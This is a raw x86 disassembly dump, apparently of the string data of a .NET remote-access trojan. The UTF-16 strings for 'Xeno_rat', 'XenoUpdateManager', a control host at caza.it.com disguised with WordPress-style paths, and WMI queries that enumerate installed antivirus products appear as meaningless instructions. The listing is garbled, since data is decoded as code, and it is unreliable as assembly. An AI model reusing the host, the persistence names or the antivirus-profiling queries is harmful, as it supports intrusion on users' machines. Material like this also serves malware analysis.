  40ada7:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  40adab:	00 63 00             	add    %ah,0x0(%ebx)
  40adae:	6c                   	insb   (%dx),%es:(%edi)
  40adaf:	00 69 00             	add    %ch,0x0(%ecx)
  40adb2:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40adb6:	74 00                	je     0x40adb8
  40adb8:	00 07                	add    %al,(%edi)
  40adba:	52                   	push   %edx
  40adbb:	00 75 00             	add    %dh,0x0(%ebp)
  40adbe:	6e                   	outsb  %ds:(%esi),(%dx)
  40adbf:	00 00                	add    %al,(%eax)
  40adc1:	43                   	inc    %ebx
  40adc2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40adc6:	72 00                	jb     0x40adc8
  40adc8:	6f                   	outsl  %ds:(%esi),(%dx)
  40adc9:	00 72 00             	add    %dh,0x0(%edx)
  40adcc:	20 00                	and    %al,(%eax)
  40adce:	77 00                	ja     0x40add0
  40add0:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  40add6:	20 00                	and    %al,(%eax)
  40add8:	73 00                	jae    0x40adda
  40adda:	75 00                	jne    0x40addc
  40addc:	62 00                	bound  %eax,(%eax)
  40adde:	6e                   	outsb  %ds:(%esi),(%dx)
  40addf:	00 6f 00             	add    %ch,0x0(%edi)
  40ade2:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40ade6:	2c 00                	sub    $0x0,%al
  40ade8:	20 00                	and    %al,(%eax)
  40adea:	73 00                	jae    0x40adec
  40adec:	75 00                	jne    0x40adee
  40adee:	62 00                	bound  %eax,(%eax)
  40adf0:	6e                   	outsb  %ds:(%esi),(%dx)
  40adf1:	00 6f 00             	add    %ch,0x0(%edi)
  40adf4:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40adf8:	20 00                	and    %al,(%eax)
  40adfa:	74 00                	je     0x40adfc
  40adfc:	79 00                	jns    0x40adfe
  40adfe:	70 00                	jo     0x40ae00
  40ae00:	65 00 3d 00 00 03 0a 	add    %bh,%gs:0xa030000
  40ae07:	00 00                	add    %al,(%eax)
  40ae09:	0b 31                	or     (%ecx),%esi
  40ae0b:	00 2e                	add    %ch,(%esi)
  40ae0d:	00 38                	add    %bh,(%eax)
  40ae0f:	00 2e                	add    %ch,(%esi)
  40ae11:	00 37                	add    %dh,(%edi)
  40ae13:	00 00                	add    %al,(%eax)
  40ae15:	09 64 00 61          	or     %esp,0x61(%eax,%eax,1)
  40ae19:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40ae1d:	00 00                	add    %al,(%eax)
  40ae1f:	2b 64 00 61          	sub    0x61(%eax,%eax,1),%esp
  40ae23:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40ae27:	00 20                	add    %ah,(%eax)
  40ae29:	00 63 00             	add    %ah,0x0(%ebx)
  40ae2c:	61                   	popa
  40ae2d:	00 6e 00             	add    %ch,0x0(%esi)
  40ae30:	20 00                	and    %al,(%eax)
  40ae32:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae33:	00 6f 00             	add    %ch,0x0(%edi)
  40ae36:	74 00                	je     0x40ae38
  40ae38:	20 00                	and    %al,(%eax)
  40ae3a:	62 00                	bound  %eax,(%eax)
  40ae3c:	65 00 20             	add    %ah,%gs:(%eax)
  40ae3f:	00 6e 00             	add    %ch,0x0(%esi)
  40ae42:	75 00                	jne    0x40ae44
  40ae44:	6c                   	insb   (%dx),%es:(%edi)
  40ae45:	00 6c 00 21          	add    %ch,0x21(%eax,%eax,1)
  40ae49:	00 00                	add    %al,(%eax)
  40ae4b:	27                   	daa
  40ae4c:	68 00 74 00 74       	push   $0x74007400
  40ae51:	00 70 00             	add    %dh,0x0(%eax)
  40ae54:	3a 00                	cmp    (%eax),%al
  40ae56:	2f                   	das
  40ae57:	00 2f                	add    %ch,(%edi)
  40ae59:	00 63 00             	add    %ah,0x0(%ebx)
  40ae5c:	61                   	popa
  40ae5d:	00 7a 00             	add    %bh,0x0(%edx)
  40ae60:	61                   	popa
  40ae61:	00 2e                	add    %ch,(%esi)
  40ae63:	00 69 00             	add    %ch,0x0(%ecx)
  40ae66:	74 00                	je     0x40ae68
  40ae68:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40ae6c:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae6d:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae70:	2f                   	das
  40ae71:	00 00                	add    %al,(%eax)
  40ae73:	39 68 00             	cmp    %ebp,0x0(%eax)
  40ae76:	74 00                	je     0x40ae78
  40ae78:	74 00                	je     0x40ae7a
  40ae7a:	70 00                	jo     0x40ae7c
  40ae7c:	3a 00                	cmp    (%eax),%al
  40ae7e:	2f                   	das
  40ae7f:	00 2f                	add    %ch,(%edi)
  40ae81:	00 63 00             	add    %ah,0x0(%ebx)
  40ae84:	61                   	popa
  40ae85:	00 7a 00             	add    %bh,0x0(%edx)
  40ae88:	61                   	popa
  40ae89:	00 2e                	add    %ch,(%esi)
  40ae8b:	00 69 00             	add    %ch,0x0(%ecx)
  40ae8e:	74 00                	je     0x40ae90
  40ae90:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40ae94:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae95:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae98:	2f                   	das
  40ae99:	00 69 00             	add    %ch,0x0(%ecx)
  40ae9c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae9d:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40aea1:	00 78 00             	add    %bh,0x0(%eax)
  40aea4:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  40aea8:	68 00 70 00 00       	push   $0x7000
  40aead:	39 68 00             	cmp    %ebp,0x0(%eax)
  40aeb0:	74 00                	je     0x40aeb2
  40aeb2:	74 00                	je     0x40aeb4
  40aeb4:	70 00                	jo     0x40aeb6
  40aeb6:	3a 00                	cmp    (%eax),%al
  40aeb8:	2f                   	das
  40aeb9:	00 2f                	add    %ch,(%edi)
  40aebb:	00 63 00             	add    %ah,0x0(%ebx)
  40aebe:	61                   	popa
  40aebf:	00 7a 00             	add    %bh,0x0(%edx)
  40aec2:	61                   	popa
  40aec3:	00 2e                	add    %ch,(%esi)
  40aec5:	00 69 00             	add    %ch,0x0(%ecx)
  40aec8:	74 00                	je     0x40aeca
  40aeca:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40aece:	6f                   	outsl  %ds:(%esi),(%dx)
  40aecf:	00 6d 00             	add    %ch,0x0(%ebp)
  40aed2:	2f                   	das
  40aed3:	00 77 00             	add    %dh,0x0(%edi)
  40aed6:	70 00                	jo     0x40aed8
  40aed8:	2d 00 61 00 64       	sub    $0x64006100,%eax
  40aedd:	00 6d 00             	add    %ch,0x0(%ebp)
  40aee0:	69 00 6e 00 2f 00    	imul   $0x2f006e,(%eax),%eax
  40aee6:	01 37                	add    %esi,(%edi)
  40aee8:	68 00 74 00 74       	push   $0x74007400
  40aeed:	00 70 00             	add    %dh,0x0(%eax)
  40aef0:	3a 00                	cmp    (%eax),%al
  40aef2:	2f                   	das
  40aef3:	00 2f                	add    %ch,(%edi)
  40aef5:	00 63 00             	add    %ah,0x0(%ebx)
  40aef8:	61                   	popa
  40aef9:	00 7a 00             	add    %bh,0x0(%edx)
  40aefc:	61                   	popa
  40aefd:	00 2e                	add    %ch,(%esi)
  40aeff:	00 69 00             	add    %ch,0x0(%ecx)
  40af02:	74 00                	je     0x40af04
  40af04:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40af08:	6f                   	outsl  %ds:(%esi),(%dx)
  40af09:	00 6d 00             	add    %ch,0x0(%ebp)
  40af0c:	2f                   	das
  40af0d:	00 77 00             	add    %dh,0x0(%edi)
  40af10:	70 00                	jo     0x40af12
  40af12:	2d 00 6a 00 73       	sub    $0x73006a00,%eax
  40af17:	00 6f 00             	add    %ch,0x0(%edi)
  40af1a:	6e                   	outsb  %ds:(%esi),(%dx)
  40af1b:	00 2f                	add    %ch,(%edi)
  40af1d:	00 01                	add    %al,(%ecx)
  40af1f:	3f                   	aas
  40af20:	68 00 74 00 74       	push   $0x74007400
  40af25:	00 70 00             	add    %dh,0x0(%eax)
  40af28:	3a 00                	cmp    (%eax),%al
  40af2a:	2f                   	das
  40af2b:	00 2f                	add    %ch,(%edi)
  40af2d:	00 63 00             	add    %ah,0x0(%ebx)
  40af30:	61                   	popa
  40af31:	00 7a 00             	add    %bh,0x0(%edx)
  40af34:	61                   	popa
  40af35:	00 2e                	add    %ch,(%esi)
  40af37:	00 69 00             	add    %ch,0x0(%ecx)
  40af3a:	74 00                	je     0x40af3c
  40af3c:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40af40:	6f                   	outsl  %ds:(%esi),(%dx)
  40af41:	00 6d 00             	add    %ch,0x0(%ebp)
  40af44:	2f                   	das
  40af45:	00 77 00             	add    %dh,0x0(%edi)
  40af48:	70 00                	jo     0x40af4a
  40af4a:	2d 00 6c 00 6f       	sub    $0x6f006c00,%eax
  40af4f:	00 67 00             	add    %ah,0x0(%edi)
  40af52:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40af58:	70 00                	jo     0x40af5a
  40af5a:	68 00 70 00 01       	push   $0x1007000
  40af5f:	2f                   	das
  40af60:	68 00 74 00 74       	push   $0x74007400
  40af65:	00 70 00             	add    %dh,0x0(%eax)
  40af68:	3a 00                	cmp    (%eax),%al
  40af6a:	2f                   	das
  40af6b:	00 2f                	add    %ch,(%edi)
  40af6d:	00 77 00             	add    %dh,0x0(%edi)
  40af70:	77 00                	ja     0x40af72
  40af72:	77 00                	ja     0x40af74
  40af74:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40af78:	61                   	popa
  40af79:	00 7a 00             	add    %bh,0x0(%edx)
  40af7c:	61                   	popa
  40af7d:	00 2e                	add    %ch,(%esi)
  40af7f:	00 69 00             	add    %ch,0x0(%ecx)
  40af82:	74 00                	je     0x40af84
  40af84:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40af88:	6f                   	outsl  %ds:(%esi),(%dx)
  40af89:	00 6d 00             	add    %ch,0x0(%ebp)
  40af8c:	2f                   	das
  40af8d:	00 00                	add    %al,(%eax)
  40af8f:	41                   	inc    %ecx
  40af90:	68 00 74 00 74       	push   $0x74007400
  40af95:	00 70 00             	add    %dh,0x0(%eax)
  40af98:	3a 00                	cmp    (%eax),%al
  40af9a:	2f                   	das
  40af9b:	00 2f                	add    %ch,(%edi)
  40af9d:	00 77 00             	add    %dh,0x0(%edi)
  40afa0:	77 00                	ja     0x40afa2
  40afa2:	77 00                	ja     0x40afa4
  40afa4:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40afa8:	61                   	popa
  40afa9:	00 7a 00             	add    %bh,0x0(%edx)
  40afac:	61                   	popa
  40afad:	00 2e                	add    %ch,(%esi)
  40afaf:	00 69 00             	add    %ch,0x0(%ecx)
  40afb2:	74 00                	je     0x40afb4
  40afb4:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40afb8:	6f                   	outsl  %ds:(%esi),(%dx)
  40afb9:	00 6d 00             	add    %ch,0x0(%ebp)
  40afbc:	2f                   	das
  40afbd:	00 69 00             	add    %ch,0x0(%ecx)
  40afc0:	6e                   	outsb  %ds:(%esi),(%dx)
  40afc1:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40afc5:	00 78 00             	add    %bh,0x0(%eax)
  40afc8:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  40afcc:	68 00 70 00 00       	push   $0x7000
  40afd1:	41                   	inc    %ecx
  40afd2:	68 00 74 00 74       	push   $0x74007400
  40afd7:	00 70 00             	add    %dh,0x0(%eax)
  40afda:	3a 00                	cmp    (%eax),%al
  40afdc:	2f                   	das
  40afdd:	00 2f                	add    %ch,(%edi)
  40afdf:	00 77 00             	add    %dh,0x0(%edi)
  40afe2:	77 00                	ja     0x40afe4
  40afe4:	77 00                	ja     0x40afe6
  40afe6:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40afea:	61                   	popa
  40afeb:	00 7a 00             	add    %bh,0x0(%edx)
  40afee:	61                   	popa
  40afef:	00 2e                	add    %ch,(%esi)
  40aff1:	00 69 00             	add    %ch,0x0(%ecx)
  40aff4:	74 00                	je     0x40aff6
  40aff6:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40affa:	6f                   	outsl  %ds:(%esi),(%dx)
  40affb:	00 6d 00             	add    %ch,0x0(%ebp)
  40affe:	2f                   	das
  40afff:	00 77 00             	add    %dh,0x0(%edi)
  40b002:	70 00                	jo     0x40b004
  40b004:	2d 00 61 00 64       	sub    $0x64006100,%eax
  40b009:	00 6d 00             	add    %ch,0x0(%ebp)
  40b00c:	69 00 6e 00 2f 00    	imul   $0x2f006e,(%eax),%eax
  40b012:	01 3f                	add    %edi,(%edi)
  40b014:	68 00 74 00 74       	push   $0x74007400
  40b019:	00 70 00             	add    %dh,0x0(%eax)
  40b01c:	3a 00                	cmp    (%eax),%al
  40b01e:	2f                   	das
  40b01f:	00 2f                	add    %ch,(%edi)
  40b021:	00 77 00             	add    %dh,0x0(%edi)
  40b024:	77 00                	ja     0x40b026
  40b026:	77 00                	ja     0x40b028
  40b028:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40b02c:	61                   	popa
  40b02d:	00 7a 00             	add    %bh,0x0(%edx)
  40b030:	61                   	popa
  40b031:	00 2e                	add    %ch,(%esi)
  40b033:	00 69 00             	add    %ch,0x0(%ecx)
  40b036:	74 00                	je     0x40b038
  40b038:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40b03c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b03d:	00 6d 00             	add    %ch,0x0(%ebp)
  40b040:	2f                   	das
  40b041:	00 77 00             	add    %dh,0x0(%edi)
  40b044:	70 00                	jo     0x40b046
  40b046:	2d 00 6a 00 73       	sub    $0x73006a00,%eax
  40b04b:	00 6f 00             	add    %ch,0x0(%edi)
  40b04e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b04f:	00 2f                	add    %ch,(%edi)
  40b051:	00 01                	add    %al,(%ecx)
  40b053:	47                   	inc    %edi
  40b054:	68 00 74 00 74       	push   $0x74007400
  40b059:	00 70 00             	add    %dh,0x0(%eax)
  40b05c:	3a 00                	cmp    (%eax),%al
  40b05e:	2f                   	das
  40b05f:	00 2f                	add    %ch,(%edi)
  40b061:	00 77 00             	add    %dh,0x0(%edi)
  40b064:	77 00                	ja     0x40b066
  40b066:	77 00                	ja     0x40b068
  40b068:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40b06c:	61                   	popa
  40b06d:	00 7a 00             	add    %bh,0x0(%edx)
  40b070:	61                   	popa
  40b071:	00 2e                	add    %ch,(%esi)
  40b073:	00 69 00             	add    %ch,0x0(%ecx)
  40b076:	74 00                	je     0x40b078
  40b078:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40b07c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b07d:	00 6d 00             	add    %ch,0x0(%ebp)
  40b080:	2f                   	das
  40b081:	00 77 00             	add    %dh,0x0(%edi)
  40b084:	70 00                	jo     0x40b086
  40b086:	2d 00 6c 00 6f       	sub    $0x6f006c00,%eax
  40b08b:	00 67 00             	add    %ah,0x0(%edi)
  40b08e:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40b094:	70 00                	jo     0x40b096
  40b096:	68 00 70 00 01       	push   $0x1007000
  40b09b:	29 68 00             	sub    %ebp,0x0(%eax)
  40b09e:	74 00                	je     0x40b0a0
  40b0a0:	74 00                	je     0x40b0a2
  40b0a2:	70 00                	jo     0x40b0a4
  40b0a4:	73 00                	jae    0x40b0a6
  40b0a6:	3a 00                	cmp    (%eax),%al
  40b0a8:	2f                   	das
  40b0a9:	00 2f                	add    %ch,(%edi)
  40b0ab:	00 63 00             	add    %ah,0x0(%ebx)
  40b0ae:	61                   	popa
  40b0af:	00 7a 00             	add    %bh,0x0(%edx)
  40b0b2:	61                   	popa
  40b0b3:	00 2e                	add    %ch,(%esi)
  40b0b5:	00 69 00             	add    %ch,0x0(%ecx)
  40b0b8:	74 00                	je     0x40b0ba
  40b0ba:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40b0be:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0bf:	00 6d 00             	add    %ch,0x0(%ebp)
  40b0c2:	2f                   	das
  40b0c3:	00 00                	add    %al,(%eax)
  40b0c5:	3b 68 00             	cmp    0x0(%eax),%ebp
  40b0c8:	74 00                	je     0x40b0ca
  40b0ca:	74 00                	je     0x40b0cc
  40b0cc:	70 00                	jo     0x40b0ce
  40b0ce:	73 00                	jae    0x40b0d0
  40b0d0:	3a 00                	cmp    (%eax),%al
  40b0d2:	2f                   	das
  40b0d3:	00 2f                	add    %ch,(%edi)
  40b0d5:	00 63 00             	add    %ah,0x0(%ebx)
  40b0d8:	61                   	popa
  40b0d9:	00 7a 00             	add    %bh,0x0(%edx)
  40b0dc:	61                   	popa
  40b0dd:	00 2e                	add    %ch,(%esi)
  40b0df:	00 69 00             	add    %ch,0x0(%ecx)
  40b0e2:	74 00                	je     0x40b0e4
  40b0e4:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40b0e8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0e9:	00 6d 00             	add    %ch,0x0(%ebp)
  40b0ec:	2f                   	das
  40b0ed:	00 69 00             	add    %ch,0x0(%ecx)
  40b0f0:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0f1:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b0f5:	00 78 00             	add    %bh,0x0(%eax)
  40b0f8:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  40b0fc:	68 00 70 00 00       	push   $0x7000
  40b101:	3b 68 00             	cmp    0x0(%eax),%ebp
  40b104:	74 00                	je     0x40b106
  40b106:	74 00                	je     0x40b108
  40b108:	70 00                	jo     0x40b10a
  40b10a:	73 00                	jae    0x40b10c
  40b10c:	3a 00                	cmp    (%eax),%al
  40b10e:	2f                   	das
  40b10f:	00 2f                	add    %ch,(%edi)
  40b111:	00 63 00             	add    %ah,0x0(%ebx)
  40b114:	61                   	popa
  40b115:	00 7a 00             	add    %bh,0x0(%edx)
  40b118:	61                   	popa
  40b119:	00 2e                	add    %ch,(%esi)
  40b11b:	00 69 00             	add    %ch,0x0(%ecx)
  40b11e:	74 00                	je     0x40b120
  40b120:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40b124:	6f                   	outsl  %ds:(%esi),(%dx)
  40b125:	00 6d 00             	add    %ch,0x0(%ebp)
  40b128:	2f                   	das
  40b129:	00 77 00             	add    %dh,0x0(%edi)
  40b12c:	70 00                	jo     0x40b12e
  40b12e:	2d 00 61 00 64       	sub    $0x64006100,%eax
  40b133:	00 6d 00             	add    %ch,0x0(%ebp)
  40b136:	69 00 6e 00 2f 00    	imul   $0x2f006e,(%eax),%eax
  40b13c:	01 39                	add    %edi,(%ecx)
  40b13e:	68 00 74 00 74       	push   $0x74007400
  40b143:	00 70 00             	add    %dh,0x0(%eax)
  40b146:	73 00                	jae    0x40b148
  40b148:	3a 00                	cmp    (%eax),%al
  40b14a:	2f                   	das
  40b14b:	00 2f                	add    %ch,(%edi)
  40b14d:	00 63 00             	add    %ah,0x0(%ebx)
  40b150:	61                   	popa
  40b151:	00 7a 00             	add    %bh,0x0(%edx)
  40b154:	61                   	popa
  40b155:	00 2e                	add    %ch,(%esi)
  40b157:	00 69 00             	add    %ch,0x0(%ecx)
  40b15a:	74 00                	je     0x40b15c
  40b15c:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40b160:	6f                   	outsl  %ds:(%esi),(%dx)
  40b161:	00 6d 00             	add    %ch,0x0(%ebp)
  40b164:	2f                   	das
  40b165:	00 77 00             	add    %dh,0x0(%edi)
  40b168:	70 00                	jo     0x40b16a
  40b16a:	2d 00 6a 00 73       	sub    $0x73006a00,%eax
  40b16f:	00 6f 00             	add    %ch,0x0(%edi)
  40b172:	6e                   	outsb  %ds:(%esi),(%dx)
  40b173:	00 2f                	add    %ch,(%edi)
  40b175:	00 01                	add    %al,(%ecx)
  40b177:	41                   	inc    %ecx
  40b178:	68 00 74 00 74       	push   $0x74007400
  40b17d:	00 70 00             	add    %dh,0x0(%eax)
  40b180:	73 00                	jae    0x40b182
  40b182:	3a 00                	cmp    (%eax),%al
  40b184:	2f                   	das
  40b185:	00 2f                	add    %ch,(%edi)
  40b187:	00 63 00             	add    %ah,0x0(%ebx)
  40b18a:	61                   	popa
  40b18b:	00 7a 00             	add    %bh,0x0(%edx)
  40b18e:	61                   	popa
  40b18f:	00 2e                	add    %ch,(%esi)
  40b191:	00 69 00             	add    %ch,0x0(%ecx)
  40b194:	74 00                	je     0x40b196
  40b196:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40b19a:	6f                   	outsl  %ds:(%esi),(%dx)
  40b19b:	00 6d 00             	add    %ch,0x0(%ebp)
  40b19e:	2f                   	das
  40b19f:	00 77 00             	add    %dh,0x0(%edi)
  40b1a2:	70 00                	jo     0x40b1a4
  40b1a4:	2d 00 6c 00 6f       	sub    $0x6f006c00,%eax
  40b1a9:	00 67 00             	add    %ah,0x0(%edi)
  40b1ac:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40b1b2:	70 00                	jo     0x40b1b4
  40b1b4:	68 00 70 00 01       	push   $0x1007000
  40b1b9:	17                   	pop    %ss
  40b1ba:	63 00                	arpl   %eax,(%eax)
  40b1bc:	61                   	popa
  40b1bd:	00 7a 00             	add    %bh,0x0(%edx)
  40b1c0:	61                   	popa
  40b1c1:	00 2e                	add    %ch,(%esi)
  40b1c3:	00 69 00             	add    %ch,0x0(%ecx)
  40b1c6:	74 00                	je     0x40b1c8
  40b1c8:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40b1cc:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1cd:	00 6d 00             	add    %ch,0x0(%ebp)
  40b1d0:	00 21                	add    %ah,(%ecx)
  40b1d2:	58                   	pop    %eax
  40b1d3:	00 65 00             	add    %ah,0x0(%ebp)
  40b1d6:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1d7:	00 6f 00             	add    %ch,0x0(%edi)
  40b1da:	5f                   	pop    %edi
  40b1db:	00 72 00             	add    %dh,0x0(%edx)
  40b1de:	61                   	popa
  40b1df:	00 74 00 5f          	add    %dh,0x5f(%eax,%eax,1)
  40b1e3:	00 6e 00             	add    %ch,0x0(%esi)
  40b1e6:	64 00 38             	add    %bh,%fs:(%eax)
  40b1e9:	00 39                	add    %bh,(%ecx)
  40b1eb:	00 31                	add    %dh,(%ecx)
  40b1ed:	00 32                	add    %dh,(%edx)
  40b1ef:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b1f3:	0f 61 00             	punpcklwd (%eax),%mm0
  40b1f6:	70 00                	jo     0x40b1f8
  40b1f8:	70 00                	jo     0x40b1fa
  40b1fa:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b1fe:	74 00                	je     0x40b200
  40b200:	61                   	popa
  40b201:	00 00                	add    %al,(%eax)
  40b203:	15 6e 00 6f 00       	adc    $0x6f006e,%eax
  40b208:	74 00                	je     0x40b20a
  40b20a:	68 00 69 00 6e       	push   $0x6e006900
  40b20f:	00 67 00             	add    %ah,0x0(%edi)
  40b212:	73 00                	jae    0x40b214
  40b214:	65 00 74 00 00       	add    %dh,%gs:0x0(%eax,%eax,1)
  40b219:	0d 2d 00 61 00       	or     $0x61002d,%eax
  40b21e:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40b222:	69 00 6e 00 01 03    	imul   $0x301006e,(%eax),%eax
  40b228:	25 00 00 1d 25       	and    $0x251d0000,%eax
  40b22d:	00 5c 00 58          	add    %bl,0x58(%eax,%eax,1)
  40b231:	00 65 00             	add    %ah,0x0(%ebp)
  40b234:	6e                   	outsb  %ds:(%esi),(%dx)
  40b235:	00 6f 00             	add    %ch,0x0(%edi)
  40b238:	4d                   	dec    %ebp
  40b239:	00 61 00             	add    %ah,0x0(%ecx)
  40b23c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b23d:	00 61 00             	add    %ah,0x0(%ecx)
  40b240:	67 00 65 00          	add    %ah,0x0(%di)
  40b244:	72 00                	jb     0x40b246
  40b246:	5c                   	pop    %esp
  40b247:	00 00                	add    %al,(%eax)
  40b249:	23 58 00             	and    0x0(%eax),%ebx
  40b24c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b250:	6f                   	outsl  %ds:(%esi),(%dx)
  40b251:	00 55 00             	add    %dl,0x0(%ebp)
  40b254:	70 00                	jo     0x40b256
  40b256:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b25a:	74 00                	je     0x40b25c
  40b25c:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40b260:	61                   	popa
  40b261:	00 6e 00             	add    %ch,0x0(%esi)
  40b264:	61                   	popa
  40b265:	00 67 00             	add    %ah,0x0(%edi)
  40b268:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b26c:	00 01                	add    %al,(%ecx)
  40b26e:	00 07                	add    %al,(%edi)
  40b270:	20 00                	and    %al,(%eax)
  40b272:	2d 00 20 00 01       	sub    $0x1002000,%eax
  40b277:	05 5c 00 5c 00       	add    $0x5c005c,%eax
  40b27c:	00 2b                	add    %ch,(%ebx)
  40b27e:	5c                   	pop    %esp
  40b27f:	00 72 00             	add    %dh,0x0(%edx)
  40b282:	6f                   	outsl  %ds:(%esi),(%dx)
  40b283:	00 6f 00             	add    %ch,0x0(%edi)
  40b286:	74 00                	je     0x40b288
  40b288:	5c                   	pop    %esp
  40b289:	00 53 00             	add    %dl,0x0(%ebx)
  40b28c:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b290:	75 00                	jne    0x40b292
  40b292:	72 00                	jb     0x40b294
  40b294:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40b29a:	43                   	inc    %ebx
  40b29b:	00 65 00             	add    %ah,0x0(%ebp)
  40b29e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b29f:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40b2a3:	00 72 00             	add    %dh,0x0(%edx)
  40b2a6:	32 00                	xor    (%eax),%al
  40b2a8:	00 3d 53 00 45 00    	add    %bh,0x450053
  40b2ae:	4c                   	dec    %esp
  40b2af:	00 45 00             	add    %al,0x0(%ebp)
  40b2b2:	43                   	inc    %ebx
  40b2b3:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40b2b7:	00 2a                	add    %ch,(%edx)
  40b2b9:	00 20                	add    %ah,(%eax)
  40b2bb:	00 46 00             	add    %al,0x0(%esi)
  40b2be:	52                   	push   %edx
  40b2bf:	00 4f 00             	add    %cl,0x0(%edi)
  40b2c2:	4d                   	dec    %ebp
  40b2c3:	00 20                	add    %ah,(%eax)
  40b2c5:	00 41 00             	add    %al,0x0(%ecx)
  40b2c8:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2c9:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b2cd:	00 76 00             	add    %dh,0x0(%esi)
  40b2d0:	69 00 72 00 75 00    	imul   $0x750072,(%eax),%eax
  40b2d6:	73 00                	jae    0x40b2d8
  40b2d8:	50                   	push   %eax
  40b2d9:	00 72 00             	add    %dh,0x0(%edx)
  40b2dc:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2dd:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40b2e1:	00 63 00             	add    %ah,0x0(%ebx)
  40b2e4:	74 00                	je     0x40b2e6
  40b2e6:	00 17                	add    %dl,(%edi)
  40b2e8:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40b2ec:	73 00                	jae    0x40b2ee
  40b2ee:	70 00                	jo     0x40b2f0
  40b2f0:	6c                   	insb   (%dx),%es:(%edi)
  40b2f1:	00 61 00             	add    %ah,0x0(%ecx)
  40b2f4:	79 00                	jns    0x40b2f6
  40b2f6:	4e                   	dec    %esi
  40b2f7:	00 61 00             	add    %ah,0x0(%ecx)
  40b2fa:	6d                   	insl   (%dx),%es:(%edi)
  40b2fb:	00 65 00             	add    %ah,0x0(%ebp)
  40b2fe:	00 07                	add    %al,(%edi)
  40b300:	4e                   	dec    %esi
  40b301:	00 2f                	add    %ch,(%edi)
  40b303:	00 41 00             	add    %al,0x0(%ecx)
  40b306:	00 05 2c 00 20 00    	add    %al,0x20002c
  40b30c:	00 47 53             	add    %al,0x53(%edi)
  40b30f:	00 45 00             	add    %al,0x0(%ebp)
  40b312:	4c                   	dec    %esp
  40b313:	00 45 00             	add    %al,0x0(%ebp)
  40b316:	43                   	inc    %ebx
  40b317:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40b31b:	00 2a                	add    %ch,(%edx)
  40b31d:	00 20                	add    %ah,(%eax)
  40b31f:	00 46 00             	add    %al,0x0(%esi)
  40b322:	52                   	push   %edx
  40b323:	00 4f 00             	add    %cl,0x0(%edi)
  40b326:	4d                   	dec    %ebp
  40b327:	00 20                	add    %ah,(%eax)
  40b329:	00 57 00             	add    %dl,0x0(%edi)
  40b32c:	69 00 6e 00 33 00    	imul   $0x33006e,(%eax),%eax
  40b332:	32 00                	xor    (%eax),%al
  40b334:	5f                   	pop    %edi
  40b335:	00 4f 00             	add    %cl,0x0(%edi)
  40b338:	70 00                	jo     0x40b33a
